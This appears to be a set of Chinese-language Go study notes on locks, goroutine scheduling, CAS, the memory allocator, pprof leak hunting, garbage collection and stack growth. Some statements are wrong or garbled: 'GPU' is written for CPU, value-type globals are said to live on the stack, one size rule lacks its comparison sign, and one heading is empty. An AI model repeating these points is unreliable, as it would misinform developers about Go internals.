- 互斥锁

Go并发程序对共享资源进行访问控制的主要手段，由标准库代码包中sync中的Mutex结构体表示。

声明一个互斥锁：

```go
var mutex sync.Mutex
```

不像C或Java的锁类工具，我们可能会犯一个错误：忘记及时解开已被锁住的锁，从而导致流程异常。但Go由于存在defer，所以此类问题出现的概率极低。关于defer解锁的方式如下：

```go
var mutex sync.Mutex
func Write()  {
   mutex.Lock()
   defer mutex.Unlock()
}
```

如果对一个已经上锁的对象再次上锁，那么就会导致该锁定操作被阻塞，直到该互斥锁回到被解锁状态.

互斥锁锁定操作的逆操作并不会导致协程阻塞，但是有可能导致引发一个无法恢复的运行时的panic，比如对一个未锁定的互斥锁进行解锁时就会发生panic。避免这种情况的最有效方式就是使用defer。

我们知道如果遇到panic，可以使用recover方法进行恢复，但是如果对重复解锁互斥锁引发的panic却是无用的（Go 1.8及以后）。

- 读写锁

读写锁是针对读写操作的互斥锁，可以分别针对读操作与写操作进行锁定和解锁操作 。

读写锁的访问控制规则如下：

① 多个写操作之间是互斥的
② 写操作与读操作之间也是互斥的
③ 多个读操作之间不是互斥的

在Go的标准库代码包中sync中的RWMutex结构体表示为:

```go
// RWMutex是一个读/写互斥锁，可以由任意数量的读操作或单个写操作持有。
// RWMutex的零值是未锁定的互斥锁。
// 首次使用后，不得复制RWMutex。
// 如果goroutine持有RWMutex进行读取而另一个goroutine可能会调用Lock，那么在释放初始读锁之前，goroutine不应该期望能够获取读锁定。 
// 特别是，这种禁止递归读锁定。 这是为了确保锁最终变得可用; 阻止的锁定会阻止新读操作获取锁定。
type RWMutex struct {
     w           Mutex  //如果有待处理的写操作就持有
     writerSem   uint32 // 写操作等待读操作完成的信号量
     readerSem   uint32 //读操作等待写操作完成的信号量
     readerCount int32  // 待处理的读操作数量
     readerWait  int32  // number of departing readers
}
```

sync中的RWMutex有以下几种方法：

```go
//对读操作的锁定
func (rw *RWMutex) RLock()

//对读操作的解锁
func (rw *RWMutex) RUnlock()

//对写操作的锁定
func (rw *RWMutex) Lock()

//对写操作的解锁
func (rw *RWMutex) Unlock()

//返回一个实现了sync.Locker接口类型的值，实际上是回调rw.RLock and rw.RUnlock.
func (rw *RWMutex) RLocker() Locker
```

- sync.Map安全锁

golang中的sync.Map是并发安全的，其实也就是sync包中golang自定义的一个名叫Map的结构体。

### Goroutine和线程的区别

从调度上看，goroutine的调度开销远远小于线程调度开销。

OS的线程由OS内核调度，每隔几毫秒，一个硬件时钟中断发到CPU，CPU调用一个调度器内核函数。这个函数暂停当前正在运行的线程，把他的寄存器信息保存到内存中，查看线程列表并决定接下来运行哪一个线程，再从内存中恢复线程的注册表信息，最后继续执行选中的线程。这种线程切换需要一个完整的上下文切换：即保存一个线程的状态到内存，再恢复另外一个线程的状态，最后更新调度器的数据结构。某种意义上，这种操作还是很慢的。

Go运行的时候包涵一个自己的调度器，这个调度器使用一个称为一个M:N调度技术，m个goroutine到n个os线程（可以用**GOMAXPROCS**来控制n的数量），Go的调度器不是由硬件时钟来定期触发的，而是由特定的go语言结构来触发的，他不需要切换到内核语境，所以调度一个goroutine比调度一个线程的成本低很多。

从栈空间上，goroutine的栈空间更加动态灵活。

每个OS的线程都有一个固定大小的栈内存，通常是2MB，栈内存用于保存在其他函数调用期间哪些正在执行或者临时暂停的函数的局部变量。这个固定的栈大小，如果对于goroutine来说，可能是一种巨大的浪费。作为对比goroutine在生命周期开始只有一个很小的栈，典型情况是2KB, 在go程序中，一次创建十万左右的goroutine也不罕见（2KB*100,000=200MB）。而且goroutine的栈不是固定大小，它可以按需增大和缩小，最大限制可以到1GB。

goroutine没有一个特定的标识。

在大部分支持多线程的操作系统和编程语言中，线程有一个独特的标识，通常是一个整数或者指针，这个特性可以让我们构建一个线程的局部存储，本质是一个全局的map，以线程的标识作为键，这样每个线程可以独立使用这个map存储和获取值，不受其他线程干扰。

goroutine中没有可供程序员访问的标识，原因是一种纯函数的理念，不希望滥用线程局部存储导致一个不健康的超距作用，即函数的行为不仅取决于它的参数，还取决于运行它的线程标识。

### Go中CAS是怎么回事

CAS算法（Compare And Swap）是原子操作的一种, CAS算法是一种有名的无锁算法。无锁编程，即不使用锁的情况下实现多线程之间的变量同步，也就是在没有线程被阻塞的情况下实现变量的同步，所以也叫非阻塞同步（Non-blocking Synchronization）。可用于在多线程编程中实现不被打断的数据交换操作，从而避免多线程同时改写某一数据时由于执行顺序不确定性以及中断的不可预知性产生的数据不一致问题。

该操作通过将内存中的值与指定数据进行比较，当数值一样时将内存中的数据替换为新的值。

Go中的CAS操作是借用了CPU提供的原子性指令来实现。CAS操作修改共享变量时候不需要对共享变量加锁，而是通过类似乐观锁的方式进行检查，本质还是不断的占用CPU 资源换取加锁带来的开销（比如上下文切换开销）。

### G0的作用

在Go中 g0作为一个特殊的goroutine，为 scheduler 执行调度循环提供了场地（栈）。对于一个线程来说，g0 总是它第一个创建的 goroutine。

之后，它会不断地寻找其他普通的 goroutine 来执行，直到进程退出。

当需要执行一些任务，且不想扩栈时，就可以用到 g0 了，因为 g0 的栈比较大。

g0 其他的一些“职责”有：创建 `goroutine`、`deferproc` 函数里新建 `_defer`、垃圾回收相关的工作（例如 stw、扫描 goroutine 的执行栈、一些标识清扫的工作、栈增长）等等。

### Go互斥锁的两种实现

#### 用Mutex实现

```go
package main
import (
    "fmt"
    "sync"
)
var num int
var mtx sync.Mutex
var wg sync.WaitGroup
func add() {
    mtx.Lock()
    defer mtx.Unlock()
    defer wg.Done()
    num += 1
}
func main() {
    for i := 0; i < 100; i++ {
        wg.Add(1)
        go add()
    }
    wg.Wait()
    fmt.Println("num:", num)
}
```

#### 使用chan实现

```go
package main
import (
    "fmt"
    "sync"
)
var num int
func add(h chan int, wg *sync.WaitGroup) {
    defer wg.Done()
    h <- 1
    num += 1
    <-h
}
func main() {
    ch := make(chan int, 1)
    wg := &sync.WaitGroup{}
    for i := 0; i < 100; i++ {
        wg.Add(1)
        go add(ch, wg)
    }
    wg.Wait()
    fmt.Println("num:", num)
}
```

## Go内存分配器

内存管理一般包含三个不同的组件，分别是用户程序（Mutator）、分配器（Allocator）和收集器（Collector），当用户程序申请内存时，它会通过内存分配器申请新内存，而分配器会负责从堆中初始化相应的内存区域。

### 基本概念

申请到的内存块被分配了三个区域，在X64上分别是512MB，16GB，512GB大小。分别是arena、bitmap、spans。

![134.jpg](https://b3logfile.com/file/2021/04/134-ba030152.jpg?imageView2/2/w/1280/format/jpg/interlace/1/q/100)

`arena区域`就是我们所谓的堆区，Go动态分配的内存都是在这个区域，它把内存分割成`8KB`大小的页，一些页组合起来称为`mspan`。

`bitmap区域`标识`arena`区域哪些地址保存了对象，并且用`4bit`标志位表示对象是否包含指针、`GC`标记信息。`bitmap`中一个`byte`大小的内存对应`arena`区域中4个指针大小（指针大小为 8B ）的内存，所以`bitmap`区域的大小是`512GB/(4*8B)=16GB`。

`spans区域`存放`mspan`（也就是一些`arena`分割的页组合起来的内存管理基本单元，后文会再讲）的指针，每个指针对应一页，所以spans区域的大小就是`512GB/8KB*8B=512MB`。除以8KB是计算`arena`区域的页数，而最后乘以8是计算`spans`区域所有指针的大小。创建`mspan`的时候，按页填充对应的`spans`区域，在回收`object`时，根据地址很容易就能找到它所属的`mspan`。

### 内存管理单元

`mspan`：Go中内存管理的基本单元，是由一片连续的`8KB`的页组成的大块内存。注意，这里的页和操作系统本身的页并不是一回事，它一般是操作系统页大小的几倍。一句话概括：`mspan`是一个包含起始地址、`mspan`规格、页的数量等内容的双端链表。

每个`mspan`按照它自身的属性`Size Class`的大小分割成若干个`object`，每个`object`可存储一个对象。并且会使用一个位图来标记其尚未使用的`object`。属性`Size Class`决定`object`大小，而`mspan`只会分配给和`object`尺寸大小接近的对象，当然，对象的大小要小于`object`大小。

### 内存管理组件

内存分配由内存分配器完成。分配器由3种组件构成：`mcache`, `mcentral`, `mheap`。

#### mcache

`mcache`：每个工作线程都会绑定一个mcache，本地缓存可用的`mspan`资源，这样就可以直接给Goroutine分配，因为不存在多个Goroutine竞争的情况，所以不会消耗锁资源。

`mcache`在初始化的时候是没有任何`mspan`资源的，在使用过程中会动态地从`mcentral`申请，之后会缓存下来。当对象小于等于32KB大小时，使用`mcache`的相应规格的`mspan`进行分配。

#### mcentral

`mcentral`：为所有`mcache`提供切分好的`mspan`资源。每个`central`保存一种特定大小的全局`mspan`列表，包括已分配出去的和未分配出去的。 每个`mcentral`对应一种`mspan`，而`mspan`的种类导致它分割的`object`大小不同。当工作线程的`mcache`中没有合适（也就是特定大小的）的`mspan`时就会从`mcentral`获取。

`mcentral`被所有的工作线程共同享有，存在多个Goroutine竞争的情况，因此会消耗锁资源。

![img](https://pic2.zhimg.com/80/v2-f35013240082c8a6c4423a86d3a69cc5_720w.jpg)

简单说下`mcache`从`mcentral`获取和归还`mspan`的流程：

- 获取 加锁；从`nonempty`链表找到一个可用的`mspan`；并将其从`nonempty`链表删除；将取出的`mspan`加入到`empty`链表；将`mspan`返回给工作线程；解锁。
- 归还 加锁；将`mspan`从`empty`链表删除；将`mspan`加入到`nonempty`链表；解锁。

#### mheap

`mheap`：代表Go程序持有的所有堆空间，Go程序使用一个`mheap`的全局对象`_mheap`来管理堆内存。

当`mcentral`没有空闲的`mspan`时，会向`mheap`申请。而`mheap`没有资源时，会向操作系统申请新内存。`mheap`主要用于大对象的内存分配，以及管理未切割的`mspan`，用于给`mcentral`切割成小对象。

同时我们也看到，`mheap`中含有所有规格的`mcentral`，所以，当一个`mcache`从`mcentral`申请`mspan`时，只需要在独立的`mcentral`中使用锁，并不会影响申请其他规格的`mspan`。

#### 分配流程

Go的内存分配器在分配对象时，根据对象的大小，分成三类：小对象（小于等于16B）、一般对象（大于16B，小于等于32KB）、大对象（大于32KB）。

大体上的分配流程：

- 32KB 的对象，直接从mheap上分配；
- <=16B 的对象使用mcache的tiny分配器分配；
- (16B,32KB] 的对象，首先计算对象的规格大小，然后使用mcache中相应规格大小的mspan分配；
- 如果mcache没有相应规格大小的mspan，则向mcentral申请
- 如果mcentral没有相应规格大小的mspan，则向mheap申请
- 如果mheap中也没有合适大小的mspan，则向操作系统申请

#### 总结

- Go在程序启动时，会向操作系统申请一大块内存，之后自行管理。
- Go内存管理的基本单元是mspan，它由若干个页组成，每种mspan可以分配特定大小的object。
- mcache, mcentral, mheap是Go内存管理的三大组件，层层递进。mcache管理线程在本地缓存的mspan；mcentral管理全局的mspan供所有线程使用；mheap管理Go的所有动态分配内存。
- 极小对象会分配在一个object中，以节省资源，使用tiny分配器分配内存；一般小对象通过mspan分配内存；大对象则直接由mheap分配内存。

### Golang的内存模型中为什么小对象多了会造成GC压力

通常小对象过多会导致GC三色法消耗过多的GPU。优化思路是，减少对象分配.

### 在Go函数中为什么会发生内存泄露

通常内存泄漏，指的是能够预期的能很快被释放的内存由于附着在了长期存活的内存上、或生命期意外地被延长，导致预计能够立即回收的内存而长时间得不到回收。

在 Go 中，由于 goroutine 的存在，因此,内存泄漏除了附着在长期对象上之外，还存在多种不同的形式。

- 预期能被快速释放的内存因被根对象引用而没有得到迅速释放.

当有一个全局对象时，可能不经意间将某个变量附着在其上，且忽略的将其进行释放，则该内存永远不会得到释放。

- goroutine 泄漏

Goroutine 作为一种逻辑上理解的轻量级线程，需要维护执行用户代码的上下文信息。在运行过程中也需要消耗一定的内存来保存这类信息，而这些内存在目前版本的 Go 中是不会被释放的。

因此，如果一个程序持续不断地产生新的 goroutine、且不结束已经创建的 goroutine 并复用这部分内存，就会造成内存泄漏的现象.

例如:

```go
func main() {
	for i := 0; i < 10000; i++ {
		go func() {
			select {}
		}()
	}
}
```

### 内存泄漏的问题定位

#### 借助pprof排查

现在很多rpc框架有内置管理模块，允许访问管理端口通过`/debug/pprof`对服务进行采样分析（pprof会有一定的性能开销，最好分析前将负载均衡权重调低）。

集成pprof非常简单，只需要在工程中引入如下代码即可：

```go
import _ "net/http/pprof"

go func() {
	log.Println(http.ListenAndServe("localhost:6060", nil))
}()
```

然后运行`go tool pprof`进行采样：

```bash
go tool pprof -seconds=10 -http=:9999 http://localhost:6060/debug/pprof/heap
```

有时可能存在网络隔离问题，不能直接从开发机访问测试机、线上机器，或者测试机、线上机器没有安装go，那也可以这么做：

```bash
curl http://localhost:6060/debug/pprof/heap?seconds=30 > heap.out

# sz下载heap.out到本地
go tool pprof heap.out
```

go tool pprof可以收集两类采样数据：

- in_use，收集进程当前仍在使用中的内存； ![pprof inuse space](https://www.hitzhangjie.pro/blog/assets/pprof/pprof_inuse_space.png)
- alloc，收集自进程启动后的总的内存分配情况，包括已经释放掉的内存； ![pprof alloc space](https://www.hitzhangjie.pro/blog/assets/pprof/pprof_alloc_space.png)

go tool pprof展示采样信息时，申请内存以“**红色**”显示，释放内存以“**绿色**”显示。

允许采样完成后打开一个浏览器页面（通过ip:port访问），交互式地查看采样结果信息，例如callgraph、flamegraph、top信息。

#### 借助bcc排查

pprof对于分析纯go程序是非常有帮助的，但是对于cgo有点无能为力，cgo部分的代码已经跳出了go内存分配器的范围，采样也没用，那cgo部分出现内存泄露该如何排查呢？

- 要确定进程是否出现了内存泄露，可以观察进程运行期间的内存占用情况，如借助top、free -m，或者其他运维平台的监控系统，一般k8s都集成了prometheus对容器运行情况进行了监视。如果内存占用随着时间延长一直增长，没有在合理的内存占用值附近稳定下来，或者已经出现了oom killed、容器重启的问题出现，则可以初步判定进程存在内存泄露；
- 继续借助pprof工具排查go程序，如果pprof可以排查出明显的内存泄露问题，则内存泄漏问题可能是纯go部分代码引起，采用前面描述的分析、定位方法来解决；
- 如果pprof工具采样之后，没有发现明显的内存泄露的端倪，且程序中存在cgo部分的代码，怀疑cgo部分的代码存在内存泄露，此时则需借助其他手段（pprof无能为力了）来进一步分析cgo部分的可能异常；

#### 库函数：hook库函数

要分析内存是否存在泄漏，也可以考虑自己hook一下库函数，自己实现这种我们就不展开讨论了。还是看看有没有趁手的好工具，能实实在在地、靠谱地帮我们解决实际问题（尽管趁手的工具也可能也是基于某种hook的能力实现的）。

#### Kernel：谁能逃脱我的法眼

## Go垃圾回收

**垃圾回收(GC)是在后台运行一个守护线程，它的作用是在监控各个对象的状态，识别并且丢弃不再使用的对象来释放和重用资源。**

### 简介

Golang使用的垃圾回收机制是**三色标记发法**配合**写屏障**和**辅助GC**，三色标记法是**标记-清除法**的一种增强版本。

### 前言

常用的垃圾回收的方法:

- 引用计数（reference counting）

这是最简单的一种垃圾回收算法，和之前提到的智能指针异曲同工。对每个对象维护一个引用计数，当引用该对象的对象被销毁或更新时被引用对象的引用计数自动减一，当被引用对象被创建或被赋值给其他对象时引用计数自动加一。当引用计数为0时则立即回收对象。

这种方法的优点是实现简单，并且内存的回收很及时。这种算法在内存比较紧张和实时性比较高的系统中使用的比较广泛，如ios cocoa框架，php，python等。

但是简单引用计数算法也有明显的缺点：

1. 频繁更新引用计数降低了性能。

一种简单的解决方法就是编译器将相邻的引用计数更新操作合并到一次更新；还有一种方法是针对频繁发生的临时变量引用不进行计数，而是在引用达到0时通过扫描堆栈确认是否还有临时对象引用而决定是否释放。等等还有很多其他方法，具体可以参考这里。

2. 循环引用。

当对象间发生循环引用时引用链中的对象都无法得到释放。最明显的解决办法是避免产生循环引用，如cocoa引入了strong指针和weak指针两种指针类型。或者系统检测循环引用并主动打破循环链。当然这也增加了垃圾回收的复杂度。

- 标记-清除（mark and sweep）

标记-清除（mark and sweep）分为两步，标记从根变量开始迭代得遍历所有被引用的对象，对能够通过应用遍历访问到的对象都进行标记为“被引用”；标记完成后进行清除操作，对没有标记过的内存进行回收（回收同时可能伴有碎片整理操作）。
这种方法解决了引用计数的不足，但是也有比较明显的问题：每次启动垃圾回收都会暂停当前所有的正常代码执行，回收时,系统响应能力大大降低 ！当然后续也出现了很多mark&sweep算法的变种（如三色标记法）优化了这个问题。

- 分代搜集（generation）

java的jvm 就使用的分代回收的思路。在面向对象编程语言中，绝大多数对象的生命周期都非常短。分代收集的基本思想是，将堆划分为两个或多个称为代（generation）的空间。
新创建的对象存放在称为新生代（young generation）中（一般来说，新生代的大小会比 老年代小很多），随着垃圾回收的重复执行，生命周期较长的对象会被提升（promotion）到老年代中（这里用到了一个分类的思路，这个是也是科学思考的一个基本思路）。

因此，新生代垃圾回收和老年代垃圾回收两种不同的垃圾回收方式应运而生，分别用于对各自空间中的对象执行垃圾回收。新生代垃圾回收的速度非常快，比老年代快几个数量级，即使新生代垃圾回收的频率更高，执行效率也仍然比老年代垃圾回收强，这是因为大多数对象的生命周期都很短，根本无需提升到老年代。

### 标记-清除

原始的标记清楚法分为两个步骤：

1. 标记。先STP(Stop The World)，暂停整个程序的全部运行线程，将被引用的对象打上标记
2. 清除没有被打标机的对象，即回收内存资源，然后恢复运行线程。

这样做有个很大的问题就是要通过STW保证GC期间标记对象的状态不能变化，整个程序都要暂停掉，在外部看来程序就会卡顿。

### 三色标记法

三色标记法是对标记阶段的改进，原理如下：

1. 初始状态所有对象都是白色。
2. 从root根出发扫描所有根对象（下图a,b），将他们引用的对象标记为灰色（图中A，B）

> 那么什么是root呢？
> 看了很多文章都没解释这这个概念，在这儿说明下：root区域主要是程序运行到当前时刻的栈和全局数据区域。

1. 分析灰色对象是否引用了其他对象。如果没有引用其它对象则将该灰色对象标记为黑色（上图中A）；如果有引用则将它变为黑色的同时将它引用的对象也变为灰色（上图中B引用了D）
2. 重复步骤3，直到灰色对象队列为空。此时白色对象即为垃圾，进行回收。

### GC运行原理

**Golang GC的大部分处理是和用户代码并行的**。

GC期间用户代码可能会改变某些对象的状态，如何实现GC和用户代码并行呢？先看下GC工作的完整流程：

1. Mark: 包含两部分:

- Mark Prepare: 初始化GC任务，包括开启写屏障(write barrier)和辅助GC(mutator assist)，统计root对象的任务数量等。**这个过程需要STW**。
- GC Drains: 扫描所有root对象，包括全局指针和goroutine(G)栈上的指针（扫描对应G栈时需停止该G)，将其加入标记队列(灰色队列)，并循环处理灰色队列的对象，直到灰色队列为空。**该过程后台并行执行**。

2. Mark Termination: 完成标记工作，重新扫描(re-scan)全局指针和栈。因为Mark和用户程序是并行的，所以在Mark过程中可能会有新的对象分配和指针赋值，这个时候就需要通过写屏障（write barrier）记录下来，re-scan 再检查一下。**这个过程也是会STW的。**

3. Sweep: 按照标记结果回收所有的白色对象，**该过程后台并行执行**。

4. Sweep Termination: 对未清扫的span进行清扫, 只有上一轮的GC的清扫工作完成才可以开始新一轮的GC。

#### 什么是写屏障、混合写屏障，如何实现？

为了确保强弱三色不变性的并发指针更新操作，需要通过赋值器屏障技术来保证指针的读写操作一致。因此我们所说的 Go 中的写屏障、混合写屏障，其实是指赋值器的写屏障，赋值器的写屏障作为一种同步机制，使赋值器在进行指针写操作时，能够“通知”回收器，进而不会破坏弱三色不变性。

##### **Dijkstra 插入写屏障**

假设我们在应用程序中使用 Dijkstra 提出的插入写屏障，在一个垃圾收集器和用户程序交替运行的场景中会出现如上图所示的标记过程：

1. 垃圾收集器将根对象指向 A 对象标记成黑色并将 A 对象指向的对象 B 标记成灰色；
2. 用户程序修改 A 对象的指针，将原本指向 B 对象的指针指向 C 对象，这时触发写屏障将 C 对象标记成灰色；
3. 垃圾收集器依次遍历程序中的其他灰色对象，将它们分别标记成黑色；

Dijkstra 的插入写屏障是一种相对保守的屏障技术，它会将**有存活可能的对象都标记成灰色**以满足强三色不变性。在如上所示的垃圾收集过程中，实际上不再存活的 B 对象最后没有被回收；而如果我们在第二和第三步之间将指向 C 对象的指针改回指向 B，垃圾收集器仍然认为 C 对象是存活的，这些被错误标记的垃圾对象只有在下一个循环才会被回收。

##### 删除写屏障 

假设我们在应用程序中使用 Yuasa 提出的删除写屏障，在一个垃圾收集器和用户程序交替运行的场景中会出现如上图所示的标记过程：

1. 垃圾收集器将根对象指向 A 对象标记成黑色并将 A 对象指向的对象 B 标记成灰色；
2. 用户程序将 A 对象原本指向 B 的指针指向 C，触发删除写屏障，但是因为 B 对象已经是灰色的，所以不做改变；
3. **用户程序将 B 对象原本指向 C 的指针删除，触发删除写屏障，白色的 C 对象被涂成灰色**；
4. 垃圾收集器依次遍历程序中的其他灰色对象，将它们分别标记成黑色；

上述过程中的第三步触发了 Yuasa 删除写屏障的着色，因为用户程序删除了 B 指向 C 对象的指针，所以 C 和 D 两个对象会分别违反强三色不变性和弱三色不变性：

- 强三色不变性 — 黑色的 A 对象直接指向白色的 C 对象；
- 弱三色不变性 — 垃圾收集器无法从某个灰色对象出发，经过几个连续的白色对象访问白色的 C 和 D 两个对象；

Yuasa 删除写屏障通过对 C 对象的着色，保证了 C 对象和下游的 D 对象能够在这一次垃圾收集的循环中存活，避免发生悬挂指针以保证用户程序的正确性。

#### 辅助GC

Go 语⾔如果发现扫描后回收的速度跟不上分配的速度它依然会把⽤户逻辑暂停，⽤户逻辑暂停了以后也就意味着不会有新的对象出现，同时会把⽤户线程抢过来加⼊到垃圾回收⾥⾯加快垃圾回收的速度。这样⼀来原来的并发还是变成了STW，还是得把⽤户线程暂停掉，要不然扫描和回收没完没了了停不下来，因为新分配对象⽐回收快，所以这种东⻄叫做辅助回收。

#### 如何进行GC优化

1. 减少对象的分配，合理重复利用；

2. 避免string与[]byte转化；

   > 两者发生转换的时候，底层数据结结构会进行复制，因此导致 gc 效率会变低。

3. 少量使用+连接 string；

   > Go里面string是最基础的类型，是一个只读类型，针对他的每一个操作都会创建一个新的string。
   > 如果是少量小文本拼接，用 “+” 就好；如果是大量小文本拼接，用 strings.Join；如果是大量大文本拼接，用 bytes.Buffer。

4. 是养成手动回收内存的习惯：比如手动把不再使用的内存释放，把对象置成nil，也可以考虑在合适的时候调用runtime.GC()触发GC。

#### GC触发条件

自动垃圾回收的触发条件有两个：

1. 主动触发(手动触发)，通过调用`runtime.GC` 来触发`GC`，此调用阻塞式地等待当前`GC`运行完毕.
2. 被动触发，分为两种方式：
   a. 使用系统监控，当超过两分钟没有产生任何`GC`时，强制触发`GC`.
   b. 使用步调（Pacing）算法，其核心思想是控制内存增长的比例,当前内存分配达到一定比例则触发.

### STW 是什么意思？

STW 在垃圾回收过程中为了保证实现的正确性、防止无止境的内存增长等问题而不可避免的需要停止赋值器进一步操作对象图的一段过程。

### 如果内存分配速度超过了标记清除的速度怎么办？

目前的 Go 实现中，当 GC 触发后，会首先进入并发标记的阶段。并发标记会设置一个标志，并在 mallocgc 调用时进行检查。当存在新的内存分配时，会暂停分配内存过快的那些 goroutine，并将其转去执行一些辅助标记（Mark Assist）的工作，从而达到放缓继续分配、辅助 GC 的标记工作的目的。

### golang的gc回收针对堆还是栈？变量内存分配在堆还是栈？

1. **golang的垃圾回收是针对堆的**（垃圾回收都是针对堆的，这里只是做一个简单的证明）
2. **引用类型的全局变量内存分配在堆上，值类型的全局变量分配在栈上**
3. **局部变量内存分配可能在栈上也可能在堆上**

## Go语言的栈空间管理是怎么样的

### 基本原理 

Go语言的运行环境（runtime）会在goroutine需要的时候动态地分配栈空间，而不是给每个goroutine分配固定大小的内存空间。这样就避免了需要程序员来决定栈的大小。

分块式的栈是最初Go语言组织栈的方式。当创建一个goroutine的时候，它会分配一个8KB的内存空间来给goroutine的栈使用。我们可能会考虑当这8KB的栈空间被用完的时候该怎么办?

为了处理这种情况，每个Go函数的开头都有一小段检测代码。这段代码会检查我们是否已经用完了分配的栈空间。如果是的话，它会调用 `morestack`函数。`morestack`函数分配一块新的内存作为栈空间，并且在这块栈空间的底部填入各种信息（包括之前的那块栈地址）。在分配了这块新的栈空间之后，它会重试刚才造成栈空间不足的函数。这个过程叫做栈分裂（stack split）。

在新分配的栈底部，还插入了一个叫做 `lessstack`的函数指针。这个函数还没有被调用。这样设置是为了从刚才造成栈空间不足的那个函数返回时做准备的。当我们从那个函数返回时，它会跳转到 `lessstack`。`lessstack`函数会查看在栈底部存放的数据结构里的信息，然后调整栈指针（stack pointer）。这样就完成了从新的栈块到老的栈块的跳转。接下来，新分配的这个块栈空间就可以被释放掉了。

`分块式的栈`让我们能够按照需求来扩展和收缩栈的大小。 Go开发者不需要花精力去估计goroutine会用到多大的栈。创建一个新的goroutine的开销也不大。当 Go开发者不知道栈会扩展到多少大时，它也能很好的处理这种情况。

这一直是之前Go语言管理栈的的方法。但这个方法有一个问题。缩减栈空间是一个开销相对较大的操作。如果在一个循环里有栈分裂，那么它的开销就变得不可忽略了。一个函数会扩展，然后分裂栈。当它返回的时候又会释放之前分配的内存块。如果这些都发生在一个循环里的话，代价是相当大的。
这就是所谓的热分裂问题（hot split problem）。它是Go语言开发者选择新的栈管理方法的主要原因。新的方法叫做 `栈复制法（stack copying）`。

栈复制法一开始和分块式的栈很像。当goroutine运行并用完栈空间的时候，与之前的方法一样，栈溢出检查会被触发。但是，不像之前的方法那样分配一个新的内存块并链接到老的栈内存块，新的方法会分配一个两倍大的内存块并把老的内存块内容复制到新的内存块里。这样做意味着当栈缩减回之前大小时，我们不需要做任何事情。栈的缩减没有任何代价。而且，当栈再次扩展时，运行环境也不需要再做任何事。它可以重用之前分配的空间。

栈的复制听起来很容易，但实际操作并非那么简单。存储在栈上的变量的地址可能已经被使用到。也就是说程序使用到了一些指向栈的指针。当移动栈的时候，所有指向栈里内容的指针都会变得无效。然而，指向栈内容的指针自身也必定是保存在栈上的。这是为了保证内存安全的必要条件。否则一个程序就有可能访问一段已经无效的栈空间了。

因为垃圾回收的需要，我们必须知道栈的哪些部分是被用作指针了。当我们移动栈的时候，我们可以更新栈里的指针让它们指向新的地址。所有相关的指针都会被更新。我们使用了垃圾回收的信息来复制栈，但并不是任何使用栈的函数都有这些信息。因为很大一部分运行环境是用C语言写的，很多被调用的运行环境里的函数并没有指针的信息，所以也就不能够被复制了。当遇到这种情况时，我们只能退回到分块式的栈并支付相应的开销。

这也是为什么现在运行环境的开发者正在用Go语言重写运行环境的大部分代码。无法用Go语言重写的部分（比如调度器的核心代码和垃圾回收器）会在特殊的栈上运行。这个特殊栈的大小由运行环境的开发者设置。

这些改变除了使栈复制成为可能，它也允许我们在将来实现并行垃圾回收。

另外一种不同的栈处理方式就是在虚拟内存中分配大内存段。由于物理内存只是在真正使用时才会被分配，因此看起来好似你可以分配一个大内存段并让操 作系统处理它。下面是这种方法的一些问题

首先，32位系统只能支持4G字节虚拟内存，并且应用只能用到其中的3G空间。由于同时运行百万goroutines的情况并不少见，因此你很可 能用光虚拟内存，即便我们假设每个goroutine的stack只有8K。

第二，然而我们可以在64位系统中分配大内存，它依赖于过量内存使用。所谓过量使用是指当你分配的内存大小超出物理内存大小时，依赖操作系统保证 在需要时能够分配出物理内存。然而，允许过量使用可能会导致一些风险。由于一些进程分配了超出机器物理内存大小的内存，如果这些进程使用更多内存 时，操作系统将不得不为它们补充分配内存。这会导致操作系统将一些内存段放入磁盘缓存，这常常会增加不可预测的处理延迟。正是考虑到这个原因，一 些新系统关闭了对过量使用的支持。

### 栈扩容和缩容

**为啥会有栈空间扩容**

由于当前的 Go 的栈结构使用的是连续栈，并且初始值才 2k 比较小，因此随着函数的调用层级加深，Go 的初始栈空间就可能不够用，不够用的话，就会触发栈空间的扩容。

**栈空间扩容啥时会触发**

编译器会为函数调用插入运行时检查`runtime.morestack`，它会在几乎所有的函数调用之前检查当前`goroutine` 的栈内存是否充足，如果当前栈需要扩容，会调用`runtime.newstack` 创建新的栈。

而新的栈空间，是旧栈空间大小（通过保存在`goroutine`中的`stack`信息里记录的栈区内存边界计算出来的）的两倍，但最大栈空间大小不能超过 `maxstacksize` ，也就是 1G。

**缩容流程**

**为啥会有栈空间缩容**

在函数返回后，对应的栈空间会回收，如果调用栈比较深，那么随着函数一个一个返回，回收的栈空间会越来越多。假设在调用栈最深的时候，整体的栈空间扩容到了 100M，那么随着函数的返回，到某一个函数的时候，100M 的栈空间只有 1M 是实际占用的，内存利用率只有区区的 1% ，实在太浪费了。

**栈空间缩容啥时会触发**

因此在垃圾回收的时候，有必要检查一下栈空间里内存利用率，当利用率低于 25% 时，就要开始进行缩容，缩容成原来的栈空间的 50%，但同时也不能小于栈空间的原始值即最小值，2KB。

**相同点**

不管是扩容还是缩容，都是使用 `runtime.copystack` 函数来开辟新的栈空间，然后将旧栈的数据全部拷贝至新的栈空间，并调整原来指针的指向。

### 栈的内存是怎么分配的

栈和堆只是虚拟内存上2块不同功能的内存区域：

- 栈在高地址，从高地址向低地址增长。
- 堆在低地址，从低地址向高地址增长。

栈和堆相比优势：

- 栈的内存管理简单，分配比堆上快。
- 栈的内存不需要回收，而堆需要，无论是主动free，还是被动的垃圾回收，这都需要花费额外的CPU。
- 栈上的内存有更好的局部性，堆上内存访问就不那么友好了，CPU访问的2块数据可能在不同的页上，CPU访问数据的时间可能就上去了。

### 栈帧构成

1. return address：函数的返回地址，占用一个指针大小的空间。实际上是在函数被调用时由 CALL 指令自动压栈的，并非由被调用函数分配；
2. caller’s BP：调用者的栈帧基址，占用一个指针大小的空间，有些情况下会被优化掉。用来将调用路径上所有的栈帧连成一个链表，方便栈回溯之类的操作。函数通过将栈指针 SP 直接向下移动指定大小，来一次性分配 caller’s BP、locals 和 args to callee 所占用的空间，在 x86 架构上就是使用 SUB 指令将 SP 减去指定大小；
3. locals：局部变量区间，占用若干机器字。用来存放函数的局部变量，根据函数的局部变量占用空间大小来分配，没有局部变量的函数不分配；
4. args to callee：调用传参区域，占用若干机器字。分配空间大小，根据当前函数发起的所有的函数调用中，返回值加上参数所占用的空间最大的，按此来分配。没有调用任何函数时，不需要分配该区间。在 callee 视角的 args from caller 区间，包含在 caller 视角的 args to callee 区间内，占用空间大小是小于等于的关系。

## Go中的逃逸分析是什么

在Go中逃逸分析是一种确定指针动态范围的方法，可以分析在程序的哪些地方可以访问到指针。它涉及到指针分析和形状分析。

